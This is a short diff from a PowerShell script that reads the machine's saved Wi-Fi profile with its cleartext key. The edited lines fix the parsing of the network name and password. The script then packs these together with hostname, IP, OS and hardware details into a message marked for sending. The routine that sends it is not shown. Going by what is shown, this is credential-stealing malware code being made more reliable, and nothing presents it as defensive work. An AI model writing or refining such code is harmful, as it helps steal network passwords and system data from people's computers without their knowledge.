@@ -28,10 +28,10 @@ $networkProfile = (Get-NetConnectionProfile).Name
 $wifiInfo = netsh wlan show profile name=$networkProfile key=clear
 
 # Extract the SSID
-$ssid = ($wifiInfo | ForEach-Object { $_ -match 'SSID name' } | ForEach-Object { $_ -replace '^.*?:', '' }).Trim()
+$ssid = ($wifiInfo | Where-Object {$_ -match 'SSID name'}).Split(':')[1].Trim()
 
 # Extract the Wi-Fi Key (password)
-$wifiKey = ($wifiInfo | ForEach-Object { $_ -match 'Key Content' } | ForEach-Object { $_ -replace '^.*?:', '' }).Trim()
+$wifiKey = ($wifiInfo | Where-Object {$_ -match 'Key Content'}).Split(':')[1].Trim()
 
 # Create the message to send
 $message = "Host: $hostname`nIP: $ipAddress`nOS: $osVersion`nCPU: $cpu`nMemory: $memory GB`nBIOS: $bios`nDisk Size: $diskSize GB`nWi-Fi SSID: $ssid`nWi-Fi Key: $wifiKey"
